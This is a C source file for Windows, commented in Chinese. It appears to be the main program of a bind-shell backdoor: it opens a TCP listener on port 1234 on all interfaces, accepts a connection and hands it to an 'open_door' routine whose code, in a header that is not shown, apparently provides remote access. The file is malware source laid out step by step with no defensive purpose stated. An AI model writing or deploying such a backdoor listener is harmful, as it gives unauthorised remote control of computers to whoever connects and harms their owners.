#include <stdio.h>
#include <winsock.h>
#include <windows.h>
#include "door.h"
struct  sockaddr_in local;

int main() {
    WSADATA WSA;
    //初始化Winsock库,确认所用的版本
    if ((WSAStartup(MAKEWORD(2,2),&WSA)) != 0) {
		printf("[e]Load WINSOCK Failed!\n");
		return -1;
	}
    
    SOCKET sock_serv, sock_lis;
    //充填sockaddr_in结构
    //任意目标地址
    local.sin_addr.S_un.S_addr=INADDR_ANY;
    //协议AF_INET
    local.sin_family = AF_INET;
    //设置监听端口
    local.sin_port = htons(1234);//host to network

    int localsize = sizeof(struct sockaddr_in);

    //获取一个套接字
    sock_serv = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sock_serv == INVALID_SOCKET){
        printf("[e]socket error!\n");
        return -1;
    }

    //将套接字和sockaddr_in结构绑定
    bind(sock_serv, (struct sockaddr*)&local, sizeof(struct sockaddr));
    //开始监听
    listen(sock_serv, 3);
    printf("[+]Begin to Listen...on port 1234\n");
    
    //accept函数将进入阻塞状态, 如果有连接请求, 阻塞解除
    //然后该函数将返回一个新的套接字描述符.用于指定这个连接
    sock_lis = accept(sock_serv, (struct sockaddr*)&local, &localsize);
    if (sock_lis == INVALID_SOCKET){
        printf("[e]Accept error!\n");
        return -1;
    }

    open_door(sock_lis);
    
    //关闭套接字
	closesocket(sock_lis);
    closesocket(sock_serv);
    puts("[+]Close Socket...");

	WSACleanup();
    return 0;
}

